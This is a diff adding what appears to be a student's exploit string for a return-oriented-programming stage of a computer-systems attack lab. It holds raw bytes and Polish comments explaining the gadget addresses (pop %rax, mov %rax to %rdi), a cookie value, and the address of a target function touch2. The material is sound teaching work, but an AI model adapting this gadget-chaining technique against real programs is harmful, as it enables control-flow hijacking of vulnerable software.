@@ -1,0 +1,15 @@
+00 00 00 40 1B 63 BF 00 00 00 00 00 00 00 00 C3 56 57 58 59 50 51 52 53 54 55 56 57 58 59 50 51 52 53 54 55 56 57 58 59 50 51 52 53 54 55 56 57 BF AE E5 A3 71 C3 00 00  FD 1C 40 00 00 00 00 00 AE E5 A3 71 00 00 00 00 E2 1C 40 00 00 00 00 00 63 1B 40 00 00 00 00 00
+/* 40 1C FD - adres poniższych instrukcji:
+58 == popq %rax
+90 == nop
+C3 == retq
+
+AE E5 A3 71 - wartość ciasteczka (0x71a3e5ae)
+
+40 1C E2 - adres poniższych instrukcji:
+48 89 c7 == movq %rax,%rdi
+90 == nop
+c3 == retq
+
+40 1B 63 - adres funkcji touch2
+ */
